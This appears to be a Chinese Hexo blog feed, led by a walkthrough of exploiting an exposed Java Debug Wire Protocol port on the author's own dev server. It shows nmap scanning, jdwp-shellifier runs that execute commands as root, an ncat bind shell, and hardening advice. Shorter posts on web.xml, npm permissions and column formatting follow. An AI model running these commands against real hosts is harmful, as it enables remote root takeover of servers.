<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure>
<p>上面是dev机器上开启的端口， <code>Java Debug Wire Protocol (Reference Implementation)</code>就是开启了<code>JDWP</code>的机器。</p>
<h2 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h2><blockquote>
<p>telnet端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p>
</blockquote>
<p>可以用下面的命令测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
<p>或者使用<code>nc</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="确定debug的端口"><a href="#确定debug的端口" class="headerlink" title="确定debug的端口"></a>确定debug的端口</h2><p>通过<code>nmap</code>确定debug的端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure>
<h2 id="nmap执行命令"><a href="#nmap执行命令" class="headerlink" title="nmap执行命令"></a>nmap执行命令</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p>
<p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p>
<p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p>
<blockquote>
<p>这种方式没有实验成功，有兴趣的同学可以试一试</p>
</blockquote>
<ul>
<li>Example Usage</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>Script Output</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure>
<h2 id="开源脚本"><a href="#开源脚本" class="headerlink" title="开源脚本"></a>开源脚本</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p>
<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
<p><code>break-on &quot;java.lang.String.indexOf&quot;</code>表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">总用量 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8月  10 14:12 777</span><br></pre></td></tr></table></figure>
<p>可以看到<code>777</code>这个文件已经创建了， 时间正好是我们执行命令的时间。</p>
<p>这只是初级玩法， 脚本的示例给的是启动一个<code>ncat</code>的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个<code>root</code>权限的shell了。</p>
<p>安装<code>ncat</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure>
<p><code>ncat</code>在服务器上开启一个端口， 转发输入交给<code>bash</code>去执行。</p>
<p>开启转发服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
<p>服务器上端口已经开启：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure>
<p>连接上去：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure>
<h1 id="远程调试的建议"><a href="#远程调试的建议" class="headerlink" title="远程调试的建议"></a>远程调试的建议</h1><p>一、线上不能开启debug，对服务器性能有影响。</p>
<p>二、关闭对外远程debug的端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>查找到对应的进程， 然后修改配置，<strong>重启tomcat</strong></p>
<p>三、远程debug步骤：</p>
<ol>
<li><p>tomcat 开启调试: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure>
<p><strong>注意必须绑定到127.0.0.1</strong></p>
</li>
<li><p>安装socat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务器安装socat进行转发:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure>
<p>其中<code>0.0.0.0/32</code>表示放开ip限制（不是内网没有办法限制出口ip)， <strong>命令不要在后台执行</strong>，否则跟开启了对外的远程debug没有区别</p>
</li>
<li><p>idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005</p>
</li>
</ol>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul>
<li>远程调试端口的地址一定要绑定到<code>127.0.0.1</code></li>
<li>tomcat用单独的组的用户启动（这个组的权限要设置到较低）</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">深入 Java 调试体系: 第 1 部分，JPDA 体系概览</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li>
<li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution · 安全手册</a></li>
<li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li>
<li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li>
<li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> jvm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jdwp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web.xml]]></title>
      <url>http://qsli.github.io/2018/08/11/web-xml/</url>
      <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote>
<p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p>
</blockquote>
<p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p>
<p><code>load-on-startup</code>中的值决定了进行哪种方式。</p>
<blockquote>
<p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p>
</blockquote>
<p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p>
<p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p>
<blockquote>
<p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p>
</blockquote>
<p>这个值越小，优先级越高，容器优先加载。</p>
<blockquote>
<p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p>
</blockquote>
<p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>Java Servlet Specification 3.0</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> servlet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo迁移到ubuntu]]></title>
      <url>http://qsli.github.io/2018/08/11/hexo-ubuntu/</url>
      <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure>
<p>修改owner</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure>
<p>修改owner之后就可以正常执行hexo了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux终端对齐问题]]></title>
      <url>http://qsli.github.io/2018/07/11/column-view/</url>
      <content type="html"><![CDATA[<h2 id="输出乱了"><a href="#输出乱了" class="headerlink" title="输出乱了?"></a>输出乱了?</h2><p>比如<code>vmstat</code>命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 </span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 4577556 281532 3674532    0    0    64    36  192  784  5  1 93  1  0</span><br><span class="line"> 0  0      0 4577992 281532 3674552    0    0     0     0  417 1089  1  1 98  0  0</span><br><span class="line"> 0  0      0 4577960 281540 3674532    0    0     0    44  401 1105  1  0 98  1  0</span><br><span class="line"> 2  0      0 4577960 281540 3674548    0    0     0     0  307  834  1  0 99  0  0</span><br><span class="line"> 0  0      0 4577960 281548 3674548    0    0     0    48  318  773  1  0 99  1  0</span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="其实-加个column就好了"><a href="#其实-加个column就好了" class="headerlink" title="其实, 加个column就好了"></a>其实, 加个<code>column</code>就好了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 5 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  -system--  ------cpu-----</span><br><span class="line">r      b                            swpd       free         buff       cache           si  so  bi  bo   in   cs    us  sy  id  wa  st</span><br><span class="line">5      0                            0          4565016      281996     3675732         0   0   63  36   192  784   5   1   93  1   0</span><br><span class="line">0      0                            0          4564836      281996     3675756         0   0   0   0    345  805   1   0   99  1   0</span><br><span class="line">0      0                            0          4564744      282004     3675736         0   0   0   88   489  1305  1   0   98  0   0</span><br><span class="line">2      0                            0          4565456      282004     3675736         0   0   0   0    401  1042  1   0   99  0   0</span><br><span class="line">0      0                            0          4566400      282016     3675736         0   0   0   132  823  2357  1   1   98  1   0</span><br></pre></td></tr></table></figure>
<p>整整齐齐啊, 神清气爽, 不过如果使用<code>vmstat 1 | column -t</code>就会没有任何输出,  <code>vmstat 1</code>相当于每一秒输出一行, <code>column -t</code>会一直傻傻地等着, 所以什么都看不到.</p>
<p>看下manual:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-t      Determine the number of columns the input contains and create a table.  Columns are delimited with whitespace, by default, or</span><br><span class="line">             with the characters supplied using the -s option.  Useful for pretty-printing displays.</span><br></pre></td></tr></table></figure>
<p>为了形式上的好看, 还是忍一忍吧.</p>
<h3 id="行太长了"><a href="#行太长了" class="headerlink" title="行太长了?"></a>行太长了?</h3><p>有的时候会遇到另外一种情况, 就是一行太长了, 这时候满屏都是花的, 比如下面这个:</p>
<img src="/2018/07/11/column-view/mess.png" title="终端中杂乱的输出">
<p>终端中显示的是杂乱的, 但是整个复制出来就神奇的变好了(注意, 不要打开text wrapping)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs </span><br><span class="line">                    CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      </span><br><span class="line">          HI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          6          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          1          0</span><br><span class="line">       TIMER:   43050851   44411905   43919992   42442914   43015809   42846597   42569992   41861589   48809346   43382044   43304198   43899929   46604992   49141675   43598221   44605969   36416696   40245419   43755210   38241174   40310482   36846535   40234221   36373316   37261964   40299828   40815229   48124964   38746814   40687667   39654342   44596933</span><br><span class="line">      NET_TX:     159131      57649        987        947       1124        960        887        897      53415      44445        907        982       5556      31456        921        928        604        665      58417        565       4375        615      16263        532        658        573      15546      23825        560    